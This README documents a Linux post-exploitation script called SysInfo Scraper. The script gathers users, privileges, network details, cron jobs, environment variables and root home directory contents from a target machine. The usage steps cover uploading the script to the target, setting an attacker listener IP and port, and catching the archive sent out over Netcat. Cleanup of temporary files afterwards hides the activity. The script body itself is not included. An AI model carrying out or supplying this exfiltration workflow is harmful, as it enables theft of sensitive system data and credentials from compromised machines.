# SysInfo Scraper

A Linux post-exploitation information gathering script. Collects system, user, privilege, network, cron, package, and environment information, then sends it to your machine as a compressed archive.

---

## Features

- Collects system information (`uname`, OS release)  
- Gathers user accounts and permissions  
- Lists network interfaces, routes, and open ports  
- Captures cron jobs, installed packages, and environment variables  
- Collects root home directory contents  
- Compresses all data into a single archive and sends it via Netcat  
- Automatically cleans up temporary files after execution  

---

## Usage

1. Upload `scraper.sh` to the target machine.  
2. Make it executable:

```bash
chmod +x scraper.sh

## Set your listener IP and port in the script:

LHOST="YOUR_IP"
LPORT="YOUR_PORT"

## Start a Netcat listener on your machine:

nc -lvnp YOUR_PORT > sysinfo.tar.gz

## Run the scraper on the target:

./scraper.sh

Once complete, the archive sysinfo.tar.gz will contain all collected information.

License

Use responsibly. For educational purposes only.
